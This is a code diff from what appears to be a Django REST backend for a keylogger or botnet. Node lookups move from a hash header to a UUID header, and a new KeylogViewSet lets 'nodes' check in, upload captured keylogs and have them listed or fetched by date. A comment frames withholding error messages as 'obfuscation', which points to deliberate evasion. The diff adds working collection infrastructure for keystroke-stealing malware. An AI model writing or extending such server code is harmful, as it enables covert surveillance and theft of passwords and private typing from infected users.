@@ -21,10 +21,10 @@ class NodeViewSet(viewsets.ViewSet):
         return Response(serializer.data)
 
     def retrieve(self, request, pk=None):
-        hash_sum = request.headers["hash-sum"]
+        uuid = request.headers["uuid"]
 
         queryset = Node.objects.all()
-        node = get_object_or_404(queryset, hash_sum=hash_sum)
+        node = get_object_or_404(queryset, uuid=uuid)
         serializer = NodeSerializer(node)
         return Response(serializer.data)
 
@@ -38,9 +38,9 @@ class NodeViewSet(viewsets.ViewSet):
         return Response(status=status.HTTP_400_BAD_REQUEST)
 
     def update(self, request, pk=None):
-        hash_sum = request.headers["hash-sum"]
+        uuid = request.headers["uuid"]
 
-        node = get_object_or_404(Node, hash_sum=hash_sum)
+        node = get_object_or_404(Node, uuid=uuid)
 
         node.last_seen = timezone.now()
         node.save()
@@ -53,9 +53,9 @@ class NodeViewSet(viewsets.ViewSet):
         return Response(status=status.HTTP_400_BAD_REQUEST)
 
     def partial_update(self, request, pk=None):
-        hash_sum = request.headers["hash-sum"]
+        uuid = request.headers["uuid"]
 
-        node = get_object_or_404(Node, hash_sum=hash_sum)
+        node = get_object_or_404(Node, uuid=uuid)
 
         node.last_seen = timezone.now()
         node.save()
@@ -68,8 +68,39 @@ class NodeViewSet(viewsets.ViewSet):
         return Response(status=status.HTTP_400_BAD_REQUEST)
 
     def destroy(self, request, pk=None):
-        hash_sum = request.headers["hash-sum"]
+        uuid = request.headers["uuid"]
 
-        node = get_object_or_404(Node, hash_sum=hash_sum)
+        node = get_object_or_404(Node, uuid=uuid)
         node.delete()
         return Response(status=status.HTTP_204_NO_CONTENT)
+
+
+class KeylogViewSet(viewsets.ViewSet):
+    def create(self, request):
+        node = get_object_or_404(Node, uuid=request.headers["uuid"])
+
+        node.last_seen = timezone.now()
+        node.save()
+
+        # request.data["log_file"] = f'{node.uuid}@{timezone.now}.log'
+        serializer = KeylogSerializer(data=request.data)
+        if serializer.is_valid():
+            serializer.save(node=node)
+            return Response(serializer.data, status=status.HTTP_201_CREATED)
+        # don't return errors = obfuscation
+        return Response(status=status.HTTP_400_BAD_REQUEST)
+
+    def list(self, request):
+        node = get_object_or_404(Node, uuid=request.headers["uuid"])
+
+        queryset = Keylog.objects.filter(node=node)
+        serializer = KeylogSerializer(queryset, many=True)
+        return Response(serializer.data)
+
+    def retrieve(self, request, pk=None):
+        node = get_object_or_404(Node, uuid=request.headers["uuid"])
+        date_time = request.query_params["date_time"]
+
+        queryset = Keylog.objects.filter(node=node, date_time=date_time)
+        serializer = KeylogSerializer(queryset, many=True)
+        return Response(serializer.data)
